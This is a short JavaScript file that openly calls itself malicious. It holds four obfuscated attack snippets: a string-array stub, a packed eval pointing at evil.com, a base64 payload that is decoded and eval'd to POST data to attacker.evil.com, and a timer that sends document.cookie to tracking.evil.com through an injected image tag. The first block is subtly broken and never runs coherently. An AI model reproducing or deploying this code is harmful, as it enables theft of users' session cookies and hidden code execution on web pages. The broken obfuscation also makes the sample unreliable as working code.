// Obfuscated malicious JavaScript
var _0x4e2a=['constructor','base64payload','window','decode'];(function(_0x1b2f0c){var _0x3a4f3c=function(_0x3b3f0c){while(--_0x3b3f0c){_0x1b2f0c['push'](_0x1b2f0c['shift']());}};var _0x5e2c1f=function(){var _0x1d2f0c={'data':{'key':'cookie','value':'session_id'},'fromCharCode':String};_0x1d2f0c[_0x4e2a[2]]=_0x1d2f0c;return _0x1d2f0c;};_0x3a4f3c(++_0x3b3f0c);}(_0x4e2a,0x96));

// Direct eval execution
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('5 3(){2 0=1.4("6");0.7("8","9")}',9,10,'data|document|var|getData|getElementById|function|secret|setAttribute|href|http://evil.com'.split('|')));

// Execute malicious code
(function() {
  var payload = 'dmFyIHggPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKeC5vcGVuKCdQT1NUJywgJ2h0dHA6Ly9hdHRhY2tlci5ldmlsLmNvbS9jb2xsZWN0Jyk7Cng=';
  var code = atob(payload);
  eval(code);
}).call(window);

// Stealth collection
(function() {
  setInterval(function() {
    document.write('<img src="http://tracking.evil.com/log?data=' + btoa(document.cookie) + '" />');
  }, 30000);
})();
